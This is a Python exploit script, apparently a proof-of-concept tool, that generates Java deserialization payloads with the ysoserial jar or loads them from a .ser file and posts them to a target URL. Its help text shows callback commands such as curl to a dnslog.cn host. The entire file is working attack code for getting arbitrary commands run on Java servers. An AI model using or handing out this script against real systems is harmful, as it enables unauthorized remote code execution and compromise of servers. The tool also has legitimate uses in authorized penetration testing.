import requests
import subprocess
import argparse

def getYsoPayload(JAR_FILE, gadget, command):
    popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE)
    return popen.stdout.read()

def getSerializeFile(FilePath):
    with open(FilePath, 'rb') as f:
        SerializeData = f.read()
    print("[+]INFO: 已读取完序列化文件")
    return SerializeData

def poc(url, data, info):
    try:
        headers = {"Content-Type":"application/x-java-serialized-object"}
        res = requests.post(url=url, headers=headers, data=data)
        print("[+]INFO: {0}数据poc发送成功,响应码：{1}".format(info, res.status_code))
        # print("[+]INFO: 响应内容：" +"\n" +  res.text)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SerialVulTest")
    parser.add_argument("-u", "--url", type=str, help="Vul URL", required=True)
    parser.add_argument("-j", "--jar", type=str, help="The local Ysoserial.jar Path")
    parser.add_argument("-g", "--gadget", type=str, help="Ysoserial.jar Gadget, Example: URLDNS or Jdk7u21 ...")
    parser.add_argument("-c", "--command", type=str, help="Ysoserial Command, Example: http://xxxx.dnslog.cn or curl http://xxxx.dnslog.cn   ...")
    parser.add_argument("-m", "--modul", type=str, default="cmdl", help="1、ser：poc以读取序列化文件数据形式发送；2、cmdl：命令行模式，命令行发送序列化poc。默认为命令行模式")
    parser.add_argument("-f", "--filepath", type=str, help="Serialize Payload File Path: /User/xxxx/Desktop/xxx.ser")
    args = parser.parse_args()
    try:
        info = ""
        url = args.url
        JAR_FILE = args.jar
        gadget = args.gadget
        command = args.command
        if (args.modul == 'ser'):
            print("[+]INFO: PoC将以读取序列化文件数据形式发送")
            FilePath = args.filepath
            data = getSerializeFile(FilePath)
            info = args.filepath
        else:
            print("[+]INFO: 未检测到-m参数输入，默认为CommandLine形式利用ysoserial.jar生成payload并发送")
            data = getYsoPayload(JAR_FILE,gadget,command)
            info = args.gadget
        poc(url, data, info)
    except Exception as e:
        print(e)
